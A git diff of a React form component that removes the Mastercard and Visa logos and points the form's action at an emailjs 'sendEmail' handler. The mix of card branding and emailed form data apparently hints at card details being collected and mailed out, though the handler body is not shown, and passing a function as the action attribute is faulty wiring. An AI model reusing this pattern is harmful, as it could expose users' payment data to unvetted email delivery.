@@ -2,8 +2,8 @@ import React from 'react';
 import emailjs from 'emailjs-com';
 import './input-data.styles.css' ;
 import {Link} from 'react-router-dom'
-import master from '../../component/pictures/master-card.svg'
-import visa from '../../component/pictures/visa.svg'
+// import master from '../../component/pictures/master-card.svg'
+// import visa from '../../component/pictures/visa.svg'
 
 
 
@@ -26,7 +26,7 @@ const Input_data =()=> {
       return (
         <div className= 'data-container'>
     
-        <form action='/data' >
+        <form action={sendEmail} >
           <input type="hidden" name="name" />
     
           <div className='input-conatiner'>
@@ -45,10 +45,10 @@ const Input_data =()=> {
           </div>
           <div className="card">
             <div className="master">
-              <img src={master} alt="master card"/>
+              {/* <img src={master} alt="master card"/> */}
               </div>
               <div className="master">
-              <img src={visa} alt="visa card"/>
+              {/* <img src={visa} alt="visa card"/> */}
             </div>
            
           </div>
